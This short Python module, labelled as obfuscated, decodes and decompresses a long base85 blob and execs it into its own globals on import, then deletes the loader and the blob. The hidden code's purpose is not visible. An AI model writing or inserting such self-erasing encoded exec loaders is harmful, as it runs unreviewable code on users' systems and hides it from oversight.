
# Obfuscated module
import base64
import zlib
import types

__obfuscated_code = "c%0o<$!^;)5WVXw2=yQfP?fa31P0t9h?5{_8ym52L13`b$YvvvDoG_V4F7vcYO%IBaTgS*4wfZx9%tUnn_<LRg5)|SbcslkGA_}W1kyvNbnT%@DhZ=Fwj#aEPnnQxA;SA|=~Ta%jXzt(bIg`Yg=AU!4{$Up-}p<AU(CCKT^iZ0Wd$)70-dcer4WC`6zdh`0(WR3b=kIU?&nl33m~j^MUO<TP>>s=#8@XlC5iycjDzrv-ITKj5`sVp$Q26(iWtvV>!3?>0aB`Gfd~!aEYzP;&YspNU^F7jjAKoO-|)!%gb*PW-J$?m7^{JRIPyyH1qp`=SGwr!$BNTiA^BY%VI5OnmmrZ`L7xN0d5lB~0f|UZ?%-Fp)t^(o6gzl*)xDW3_^UBuk=dyD(pX(R+<+pJwy@^UxTk_Lr4(sGJ#@_|Af~q9k3>K}{`nJ5(iocfIrgaXInOTlyG*}(|G{mTs=dvZCSVS#k}!zuqTWy@R8{0_(Z<}jw%eN#$y;!$x>803C>M3AedXXiEI9ngK*&L7XXo;K?s%Qok-ah2=hx%u<m!4pyLHOo%6fF}wx38i+U%0IwVOb0%Q2m;%0Ermz%j8oyM^!+Kq?jU`li!{1!^TASFjJ9Gp;DRz$8}ElT6ooC7O~umGuF*b@FPi=o+vpsfgD}#VfHJa#3t+G^3+$jK%%(nJEvIO0qP>68^oAia=ga%s{2eNA^m}ba-@>+vuKZyE+!5BSk)kggq2Ehp3fjU^JNp0SFOgv4<{jEPhR!Zw$k@$BP2LN4MRyE8TikyvaI`_~iKHxK%~1t#6)V;NZPYCB07Vs*tb(-gI?MLT6a3hpxm6?G20Et6Vycj^m8c2T&uk%q%3STo=XA0NFmz#-UAUI+^u#p_f}w*XFxmbfjt7(~A0<fnyqqgD8_q=2Zm!cE8i6#G!4<=wa8V>Vu{vV$W39hbG;k%)x2TSjTbgsL|hoyw@B-8a(~oQLjVOEtnfeBqmgQrUPl8oet<B6$krAe8qfc%C~2EmE*#qG5FdkFO4U<`&GWwtpB@nz#kv|b<+09YO_T@0S$eEPX"

def __load():
    code = zlib.decompress(base64.b85decode(__obfuscated_code))
    module_code = compile(code, __file__, 'exec')
    module_globals = globals()
    exec(module_code, module_globals)

__load()
del __load
del __obfuscated_code
